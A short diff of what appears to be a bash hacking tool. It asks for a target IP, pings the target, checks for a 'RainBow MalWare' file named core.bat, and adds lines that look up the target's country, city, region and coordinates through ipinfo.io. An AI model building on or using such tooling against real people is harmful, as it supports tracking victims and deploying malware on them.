@@ -31,10 +31,14 @@ read -p "Enter Target IP -> " tip
 read -p "Enter Your IP -> " vic
 sleep 1
 echo -e "\e[31m\nAnalzying Target"
-
 if [ $( ping -c 1 $tip | grep "1 received" | wc -c ) -eq "60" ]; then
    sleep 1
    echo -e "\nTarget Locked & Connected !\n\nChecking For RainBow MalWare\n"
+   ip=$( ping -c 1 $tip | grep PING | cut -d ' ' -f3 | tr -d '(',')' )
+   echo -e "Target Located In\e[32m$( curl -s ipinfo.io/$ip | grep "country" | cut -d ':' -f2 )\e[31mCounty\n"
+   echo -e "Target In\e[32m$( curl -s ipinfo.io/$ip | grep "city" | cut -d ':' -f2 )\e[31mCity\n"
+   echo -e "Target Current Region is\e[32m$( curl -s ipinfo.io/$ip | grep "region" | cut -d ':' -f2 )\n\e[31m"
+   echo -e "Here are Target Co-ords\e[32m$( curl -s ipinfo.io/$ip | grep "loc" | cut -d ':' -f2 )\n\e[31m"
    if [ -f core.bat ]; then
       sleep 1
       echo -e "MalWare Arranged\n"
